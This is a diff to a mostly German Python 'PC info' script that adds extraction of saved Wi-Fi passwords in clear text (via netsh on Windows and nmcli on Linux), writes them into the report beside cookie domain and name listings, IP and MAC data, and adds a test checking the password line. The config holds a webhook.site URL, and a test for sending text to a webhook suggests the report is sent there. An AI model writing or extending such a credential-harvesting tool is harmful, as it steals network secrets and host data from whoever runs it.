@@ -20,6 +20,7 @@ Features:
 - Public IP (HTTPS)
 - MAC address (best-effort)
 - Wi‑Fi info (SSID + interface; best-effort, OS-specific)
+- Wi‑Fi Passwort (best-effort, OS/Tool abhängig)
 - Cookies viewer (Chrome & Edge, Windows): domains + cookie names (NO values)
 - Prints to console
 - Saves everything to pc_info.txt
@@ -60,7 +61,7 @@ from typing import Dict, List, Tuple
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
-SCRIPT_VERSION = "1.4.0"
+SCRIPT_VERSION = "1.5.0"
 
 
 # -----------------
@@ -494,6 +495,29 @@ def get_wifi_info() -> Dict[str, str]:
     return info
 
 
+def get_wifi_password(ssid: str) -> str:
+    if not ssid or ssid == "unbekannt":
+        return "unbekannt"
+
+    if sys.platform.startswith("win"):
+        raw = run_cmd(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"])
+        for line in raw.splitlines():
+            text = line.strip()
+            if (text.startswith("Schlüsselinhalt") or text.startswith("Key Content")) and ":" in text:
+                return text.split(":", 1)[1].strip() or "unbekannt"
+        return "unbekannt"
+
+    if sys.platform.startswith("linux"):
+        raw = run_cmd(["nmcli", "-g", "802-11-wireless-security.psk", "connection", ssid]).strip()
+        return raw or "unbekannt"
+
+    if sys.platform == "darwin":
+        # macOS typically stores Wi‑Fi passwords in the Keychain; without prompting, return unknown.
+        return "unbekannt"
+
+    return "unbekannt"
+
+
 # -----------------
 # COOKIES (VIEWER – SAFE, READ‑ONLY)
 # -----------------
@@ -583,6 +607,7 @@ def build_lines() -> List[str]:
     dns_servers = get_dns_servers()
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     wifi = get_wifi_info()
+    wifi_password = get_wifi_password(wifi["ssid"])
     uptime_text = format_duration(get_uptime_seconds())
     battery = get_battery_info()
     interfaces = get_network_interfaces()
@@ -654,6 +679,7 @@ def build_lines() -> List[str]:
         "WLAN:",
         f"  Interface: {wifi['interface']}",
         f"  SSID: {wifi['ssid']}",
+        f"  Passwort: {wifi_password}",
         "",
     ])
     lines.extend(read_cookies_overview())
@@ -733,6 +759,7 @@ def _selftest() -> int:
             self.assertIn("Uptime:", lines)
             self.assertIn("Akku:", lines)
             self.assertIn("Netzwerk-Interfaces:", lines)
+            self.assertTrue(any("Passwort:" in x for x in lines))
 
         def test_send_text_to_webhook_bad_url_raises(self):
             # This should raise URLError because host is invalid.
